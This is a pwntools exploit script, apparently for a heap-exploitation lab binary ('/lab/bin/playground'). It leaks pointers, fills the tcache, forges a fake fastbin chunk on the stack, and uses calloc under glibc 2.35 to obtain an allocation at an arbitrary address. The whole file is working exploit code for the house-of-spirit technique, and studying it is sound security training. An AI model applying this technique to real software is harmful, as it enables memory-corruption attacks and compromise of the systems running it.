#!/usr/bin/env python3

import pwn
import sys

BIN_FILENAME = "/lab/bin/playground"

gdbscript = """
    set resolve-heap-via-heuristic force
    continue
"""


def exploit(p):
    # get leaks
    p.recvuntil(b"[*] stack ")
    stack_ptr = int(p.recvline()[:-1], 16)
    print(f"stack_ptr: {stack_ptr:#x}")
    p.recvuntil(b"[*] global ")
    data_ptr = int(p.recvline()[:-1], 16)
    print(f"data_ptr: {data_ptr:#x}")

    chunk_ptr = stack_ptr
    print(f"fake chunk ptr: {chunk_ptr:#x}")

    # 7 allocations to fill 0x20 bin in tcache
    tcache_allocations = []
    for _ in range(7):
        p.clean()
        p.sendline(b"malloc 0x10")
        p.recvuntil(b"[*] ")
        ptr = int(p.recvline()[:-1], 16)
        tcache_allocations.append(ptr)

    # fill 0x20 bin in tcache
    for current in tcache_allocations:
        p.sendline(f"free {current:#x}".encode())

    fake_chunk = (
        pwn.p64(0x00) +     # 0x00 prev size
        pwn.p64(0x21) +     # 0x08 current size + P flag
        pwn.p64(0x00) +     # 0x10 fd = NULL
        pwn.p64(0x00) +     # 0x18
        pwn.p64(0x00) +     # 0x20 prev size 
        pwn.p64(0x100)      # 0x28 curr size of next chunk. should be a reasonable value
    )

    # forge a fake fastbin chunk in the stack
    p.sendline(f"write {chunk_ptr:#x} {len(fake_chunk):#x}".encode())
    p.sendline(fake_chunk)

    # free the fake chunk
    # the corresponding tcache bin
    # it will be sent to fastbins
    p.sendline(f"free {chunk_ptr+0x10:#x}".encode())

    # calloc doesn't use tcache in glibc 2.35
    # requesting an allocation that matches fastbins 0x20
    # will return our arbitrary address
    p.clean()
    p.sendline(b"calloc 0x1 0x10")
    p.recvuntil(b"[*] ")
    ptr = int(p.recvline()[:-1], 16)
    input(f"done. malloc returned malicious allocation {ptr:#x}")


def main():
    if "--gdb" in sys.argv:
        p = pwn.gdb.debug(
            BIN_FILENAME,
            env={},
            gdbscript=gdbscript
        )
    else:
        p = pwn.process(BIN_FILENAME, env={})

    exploit(p)
    p.interactive()


if __name__ == "__main__":
    main()
